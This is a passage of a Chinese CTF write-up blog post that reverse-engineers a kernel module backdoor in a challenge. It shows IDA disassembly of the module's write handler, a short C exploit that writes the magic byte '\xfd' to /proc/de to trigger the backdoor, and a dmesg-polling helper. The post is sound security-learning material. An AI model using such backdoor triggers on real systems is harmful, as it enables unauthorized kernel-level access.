+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">text:</span><span class="hljs-number">0000000000000020</span>                 <span class="hljs-keyword">call</span>    __fentry__<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000025</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000026</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, offset <span class="hljs-keyword">lock</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000002D</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000030</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000032</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r13</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000034</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000036</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000037</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>000000000000003A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000000003D</span>                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">18h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000041</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">gs</span>:<span class="hljs-number">28h</span><br><span class="hljs-symbol">.text:</span>000000000000004A                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">28h</span>], <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>000000000000004E                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000050</span>                 <span class="hljs-keyword">call</span>    mutex_lock<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000055</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000058</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, offset aOrderD <span class="hljs-comment">; &quot;order:%d&quot;</span><br><span class="hljs-symbol">.text:</span>000000000000005F                 <span class="hljs-keyword">call</span>    printk<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000064</span>                 <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbx</span>]<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000067</span>                 <span class="hljs-keyword">test</span>    <span class="hljs-built_in">al</span>, <span class="hljs-built_in">al</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000069</span>                 <span class="hljs-keyword">jz</span>      loc_1D6<br><span class="hljs-symbol">.text:</span>000000000000006F                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FFh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000071</span>                 <span class="hljs-keyword">jz</span>      loc_191<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000077</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FEh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000079</span>                 <span class="hljs-keyword">jz</span>      loc_155<br><span class="hljs-symbol">.text:</span>000000000000007F                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">al</span>, <span class="hljs-number">0FDh</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000081</span>                 <span class="hljs-keyword">jnz</span>     short loc_90<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000083</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:hack<br><span class="hljs-symbol">.text:</span>000000000000008A                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>+<span class="hljs-number">8</span>], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000000008E                 <span class="hljs-keyword">jz</span>      short loc_10E<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000000090</span><br></code></pre></td></tr></table></figure>
+
+<p>只需要调用write函数写入\xfd即可(我可真是个菜鸡</p>
+<p>exp如下:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>   <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/de&quot;</span>, <span class="hljs-number">2</span>);<br>   <span class="hljs-built_in">write</span>(fd, <span class="hljs-string">&quot;\xfd&quot;</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>编译运行即可弹出计算器</p>
+<p>这里记录一个脚本可以实时查看内核的输出:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-meta">#include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#include &lt;stdlib.h&gt;</span><br><br><span class="hljs-type">int</span> compareFile(FILE *<span class="hljs-built_in">old</span>, FILE *<span class="hljs-built_in">new</span>);<br><br><span class="hljs-type">int</span> main()<br>&#123;<br>    FILE *<span class="hljs-built_in">new</span>;<br>    FILE *<span class="hljs-built_in">old</span>;<br>    <span class="hljs-type">int</span> lRet;<br>    static first = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">system</span>(&quot;touch file_new&quot;);<br>    <span class="hljs-keyword">system</span>(&quot;touch file_old&quot;);<br><br>    <span class="hljs-built_in">new</span> = fopen(&quot;file_new&quot;, &quot;rw&quot;);<br>    <span class="hljs-built_in">old</span> = fopen(&quot;file_old&quot;, &quot;rw&quot;);<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;   <br>        sleep(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">system</span>(&quot;dmesg &gt; file_new&quot;);<br>    <br>        <span class="hljs-keyword">if</span> (first == <span class="hljs-number">0</span>)<br>        &#123;   <br>            <span class="hljs-keyword">system</span>(&quot;cp file_new file_old&quot;);<br>            first++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;   <br><br>        <span class="hljs-built_in">new</span> = fopen(&quot;file_new&quot;, &quot;rw&quot;);<br>        <span class="hljs-built_in">old</span> = fopen(&quot;file_old&quot;, &quot;rw&quot;);<br>    <br>        <span class="hljs-keyword">if</span> (compareFile(<span class="hljs-built_in">new</span>, <span class="hljs-built_in">old</span>) == <span class="hljs-number">0</span>)<br>        &#123;   <br>            fclose(<span class="hljs-built_in">new</span>);<br>            fclose(<span class="hljs-built_in">old</span>);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;   <br>        <span class="hljs-keyword">else</span><br>        &#123;   <br>            fclose(<span class="hljs-built_in">new</span>);<br>            fclose(<span class="hljs-built_in">old</span>);<br>    <br>            <span class="hljs-keyword">system</span>(&quot;diff file_new file_old&quot;);<br>            <span class="hljs-keyword">system</span>(&quot;cp file_new file_old&quot;);<br>        &#125;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> compareFile(FILE *<span class="hljs-built_in">old</span>, FILE *<span class="hljs-built_in">new</span>)<br>&#123;<br>    <span class="hljs-type">char</span> c1;<br>    <span class="hljs-type">char</span> c2;<br><br>    <span class="hljs-keyword">while</span>(!feof(<span class="hljs-built_in">old</span>) &amp;&amp; !feof(<span class="hljs-built_in">new</span>))<br>    &#123;<br>        c1 = fgetc(<span class="hljs-built_in">old</span>);<br>        c2 = fgetc(<span class="hljs-built_in">new</span>);<br><br>        <span class="hljs-keyword">if</span> (c1 != c2)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((c1 == EOF)&amp;&amp;(c2 == EOF))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>编译运行并跑起来即可</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>遇到之前没遇到的东西一定不能能慌,说不定非常简单(我真是个菜鸡hhh</p>
+<p>F5大法得到的东西诡异不如直接阅读反汇编代码</p>
+<p>不过也学到了如何与linux后门进行交互,感谢出题人的良苦用心</p>
+<p><a href="https://nightrainy.github.io/2019/10/31/play-with-docker/">原文链接:https://nightrainy.github.io/2019/10/31/play-with-docker/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>play_with_docker</div>
+      <div>https://nightrainy.github.io/2019/10/31/play-with-docker/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>知世</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年10月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                    <i class="iconfont icon-cc-nd"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/11/02/%E6%95%99%E7%BB%83-%E6%88%91%E8%BF%98%E6%83%B3%E7%94%A8IO/" title="教练,我还想用IO">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">教练,我还想用IO</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/" title="play withe file structure(搬运)">
+                        <span class="hidden-mobile">play withe file structure(搬运)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
